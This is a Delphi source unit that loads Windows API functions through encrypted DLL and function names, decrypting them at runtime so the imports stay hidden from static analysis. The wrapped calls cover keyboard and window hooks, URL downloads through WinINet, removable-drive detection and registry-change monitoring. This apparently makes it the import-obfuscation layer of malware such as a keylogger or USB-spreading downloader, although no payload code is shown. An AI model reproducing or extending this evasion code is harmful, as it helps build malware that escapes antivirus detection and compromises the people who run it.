unit uWin;

interface

uses
  Windows, uEnc;

const
  k2 = 'ixmer1dIvAgTkvvJ';  // kernel32.dll
  u2 = '8NXOMOoOaXFVjD';    // user32.dll
  wI = '+R/+cXKK5aBFT7K';   // wininet.dll
  a2 = 'otLLThnob2HpoTNj';   // advapi32.dll
var
  hK2, hU2, hwI, hA2: Cardinal;

type
  HINTERNET = Pointer;

type
  tCNHE = function(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
  tOFM = function(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle; stdcall;
  tMVOF = function(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer; stdcall;
  tUVOF = function(lpBaseAddress: Pointer): BOOL; stdcall;
  tPM = function(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL; stdcall;
  tCH = function(hObject: THandle): BOOL; stdcall;
  tSWHE = function(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK; stdcall;
  tUWHE = function(hhk: HHOOK): BOOL; stdcall;
  tIRF = function(hFile: Pointer; lpBuffer: Pointer; dwNumberOfBytesToRead: DWORD; var lpdwNumberOfBytesRead: DWORD): BOOL; stdcall;
  tIOU = function(hInet: Pointer; lpszUrl: PAnsiChar; lpszHeaders: PAnsiChar; dwHeadersLength: DWORD; dwFlags: DWORD; dwContext: DWORD): HINTERNET; stdcall;
  tIOA = function(lpszAgent: PAnsiChar; dwAccessType: DWORD; lpszProxy, lpszProxyBypass: PAnsiChar; dwFlags: DWORD): HINTERNET; stdcall;
  tGDT = function(lpRootPathName: PAnsiChar): UINT; stdcall;
  tRDN = function(hRecipient: THandle; NotificationFilter: Pointer; Flags: DWORD): HDEVNOTIFY; stdcall;
  tRNCKV = function(hKey: HKEY; bWatchSubtree: BOOL; dwNotifyFilter: DWORD; hEvent: THandle; fAsynchronus: BOOL): Longint; stdcall;
  tICH = function(hInet: HINTERNET): BOOL; stdcall;

function CNHE(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;                                                                 // CallNextHookEx
function OFM(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle;                                                                 // OpenFileMapping
function MVOF(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer;        // MapViewOfFile
function UVOF(lpBaseAddress: Pointer): BOOL;                                                                                                        // UnmapViewOfFile
function PM(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL;                                                                           // PostMessageA
function CH(hObject: THandle): BOOL;                                                                                                                // CloseHandle
function SWHE(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK;                                                           // SetWindowsHookExA
function UWHE(hhk: HHOOK): BOOL;                                                                                                                    // UnhookWindowsHookEx
function IRF(hFile: HINTERNET; lpBuffer: Pointer; dwNumberOfBytesToRead: DWORD; var lpdwNumberOfBytesRead: DWORD): BOOL;                            // InternetReadFile
function IOU(hInet: HINTERNET; lpszUrl: PAnsiChar; lpszHeaders: PAnsiChar; dwHeadersLength: DWORD; dwFlags: DWORD; dwContext: DWORD): HINTERNET;    // InternetOpenUrlA
function IOA(lpszAgent: PAnsiChar; dwAccessType: DWORD; lpszProxy, lpszProxyBypass: PAnsiChar; dwFlags: DWORD): HINTERNET;                          // InternetOpenA
function GDT(lpRootPathName: PAnsiChar): UINT;                                                                                                      // GetDriveTypeA
function RDN(hRecipient: THandle; NotificationFilter: Pointer; Flags: DWORD): HDEVNOTIFY;                                                           // RegisterDeviceNotificationA
function RNCKV(hKey: HKEY; bWatchSubtree: BOOL; dwNotifyFilter: DWORD; hEvent: THandle; fAsynchronus: BOOL): Longint;                               // RegNotifyChangeKeyValue
function ICH(hInet: HINTERNET): BOOL;  // InternetCloseHandle

implementation

{****************************************************************************
                                Encrypted Functions
****************************************************************************}

function LL(Nm: string; fLs: Cardinal = 0): Cardinal;
begin
  if Nm = k2 then begin
    if (hK2 = 0) or (fls <> 0) then hK2 := LoadLibraryExA(Pchar(DE(Nm)), 0, fLs);
    Result := hK2;
  end else
  if Nm = u2 then begin
    if (hU2 = 0) or (fls <> 0)  then hU2 := LoadLibraryExA(PChar(DE(Nm)), 0, fLs);
    Result := hU2;
  end else
  if Nm = wI then begin
    if (hwI = 0) or (fls <> 0)  then hwI := LoadLibraryExA(PChar(DE(Nm)), 0, fLs);
    Result := hwI;
  end else
  if Nm = a2 then begin
    if (hA2 = 0) or (fls <> 0)  then hA2 := LoadLibraryExA(PChar(DE(Nm)), 0, fLs);
    Result := hA2;
  end else
end; { LoadLibraryExA }

function GP(MID: Cardinal; Key: string): Pointer;
begin
  Result := GetProcAddress(MID, PChar(DE(Key)));
end; { GetProcAddress }

{****************************************************************************
                                Windows Functions
****************************************************************************}

var
  fCNHE: tCNHE;
function CNHE(hhk: HHOOK; nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
begin
  if not Assigned(@fCNHE) then @fCNHE := GP(LL(u2), 'K5M+ltHDvDu7NeWJuwN');
  Result := fCNHE(hhk, nCode, wParam, lParam);
end;

var
  fOFM: tOFM;
function OFM(dwDesiredAccess: DWORD; bInheritHandle: BOOL; lpName: PChar): THandle;
begin
  if not Assigned(fOFM) then @fOFM := GP(LL(k2), 'GVgcjyvTb5VyBTatnShJiC');
  Result := fOFM(dwDesiredAccess, bInheritHandle, lpName);
end;

var
  fMVOF: tMVOF;
function MVOF(hFileMappingObject: THandle; dwDesiredAccess: DWORD; dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap: DWORD): Pointer;
begin
  if not Assigned(fMVOF) then @fMVOF := GP(LL(k2), 'ElrdJtydBuvxrqaMMA');
  Result := fMVOF(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
end;

var
  fUVOF: tUVOF;
function UVOF(lpBaseAddress: Pointer): BOOL;
begin
  if not Assigned(fUVOF) then @fUVOF := GP(LL(k2), 'cxl7akeqkqxQgIbuYsOK');
  Result := fUVOF(lpBaseAddress);
end;

var
  fPM: tPM;
function PM(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): BOOL;
begin
  if not Assigned(fPM) then @fPM := GP(LL(u2), 'Zh6j2lEN75JeQX/i');
  Result := fPM(hWnd, Msg, wParam, lParam);
end;

var
  fCH: tCH;
function CH(hObject: THandle): BOOL;
begin
  if not Assigned(fCH) then @fCH := GP(LL(k2), 'KNs2FZto48ZVWFH');
  Result := fCH(hObject);
end;

var
  fSWHE: tSWHE;
function SWHE(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK;
begin
  if not Assigned(fSWHE) then @fSWHE := GP(LL(u2), 'aBf0zyP8eAVUY9NUxa9Vn/O');
  Result := fSWHE(idHook, lpfn, hmod, dwThreadId);
end;

var
  fUWHE: tUWHE;
function UWHE(hhk: HHOOK): BOOL;
begin
  if not Assigned(fUWHE) then @fUWHE := GP(LL(u2), 'cx16/RVZYTLzrtegD5yczYU+/C');
  Result := fUWHE(hhk);
end;

var
  fIRF: tIRF;
function IRF(hFile: HINTERNET; lpBuffer: Pointer; dwNumberOfBytesToRead: DWORD; var lpdwNumberOfBytesRead: DWORD): BOOL;
begin
  if not Assigned(fIRF) then @fIRF := GP(LL(wI, 2), 'ABvgjdfL+h5UGxzDIA0awA');
  Result := fIRF(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
end;

var
  fIOU: tIOU;
function IOU(hInet: HINTERNET; lpszUrl: PAnsiChar; lpszHeaders: PAnsiChar; dwHeadersLength: DWORD; dwFlags: DWORD; dwContext: DWORD): HINTERNET;
begin
  if not Assigned(fIOU) then @fIOU := GP(LL(wI), 'ABvgjdfL+hpTrt0yohYUyB');
  Result := fIOU(hInet, lpszUrl, lpszHeaders, dwHeadersLength, dwFlags, dwContext);
end;

var
  fIOA: tIOA;
function IOA(lpszAgent: PAnsiChar; dwAccessType: DWORD; lpszProxy, lpszProxyBypass: PAnsiChar; dwFlags: DWORD): HINTERNET;
begin
  if not Assigned(fIOA) then @fIOA := GP(LL(wI), 'ABvgjdfL+hpTrt0y8B');
  Result := fIOA(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
end;

var
  fGDT: tGDT;
function GDT(lpRootPathName: PAnsiChar): UINT;
begin
  if not Assigned(fGDT) then @fGDT := GP(LL(k2, 2), 'O1I4p459j/zP9BGc3A');
  Result := fGDT(lpRootPathName);
end;

var
  fRDN: tRDN;
function RDN(hRecipient: THandle; NotificationFilter: Pointer; Flags: DWORD): HDEVNOTIFY;
begin
  if not Assigned(fRDN) then @fRDN := GP(LL(u2), 'bFA44N5Ztf7F3CxEBXHr4K/Hl38ZxN2iGm7Q');
  Result := fRDN(hRecipient, NotificationFilter, Flags);
end;

var
  fRNCKV: tRNCKV;
function RNCKV(hKey: HKEY; bWatchSubtree: BOOL; dwNotifyFilter: DWORD; hEvent: THandle; fAsynchronus: BOOL): Longint;
begin
  if not Assigned(fRNCKV) then @fRNCKV := GP(LL(a2), 'bFA4fh91hzvgbGRVtMz61qai2/T9TnK');
  Result := fRNCKV(hKey, bWatchSubtree, dwNotifyFilter, hEvent, fAsynchronus);
end;

var
  fICH: tICH;
function ICH(hInet: HINTERNET): BOOL;
begin
  if not Assigned(fICH) then @fICH := GP(LL(wI), 'ABvgjdfL+hpQCgCT42VdO6m4GD');
  Result := fICH(hInet);
end;


end.

